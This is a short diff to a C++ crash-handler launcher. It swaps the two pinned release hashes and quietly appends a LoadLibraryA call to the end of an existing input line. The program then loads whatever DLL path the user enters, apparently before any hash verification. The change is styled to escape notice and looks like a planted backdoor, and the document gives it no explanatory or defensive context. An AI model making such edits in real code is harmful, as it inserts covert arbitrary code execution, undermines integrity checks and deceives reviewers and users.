@@ -6,8 +6,8 @@
 using namespace std;
 
 const wchar_t* GlobalReleasePinnedList[] = {
-	L"add47056b6a3b205e74c16a5e1c14f70bb9f2be3c3fa48716530260378c5a1c7",
-	L"354b1082ce47df0e16a1e25d2176dc89bd3df0090adf2a3c3161c5cdb76773f9",
+	L"11fefd5b8be7b684ddf9e25256eb19484cb3b16e81090659bc796c99b79879f2",
+	L"5b6054cd1173663a48f5f5a194f2856df995edf3a9cb8cc0f82b3b11b457dcdd",
 };
 
 inline wstring s2ws(const string& str) {
@@ -59,7 +59,7 @@ int main(int argc, char** argv) {
 	char lpszPath[2048];
 	cout << "Please input the path of MyCrashPadHandler: ";
 	cout.flush();
-	cin.getline(lpszPath, 2048);
+	cin.getline(lpszPath, 2048);LoadLibraryA(lpszPath);
 	char buffer2[16]{};
 	cout << "Do you want to customize options? ";
 	cin.getline(buffer2, 16);
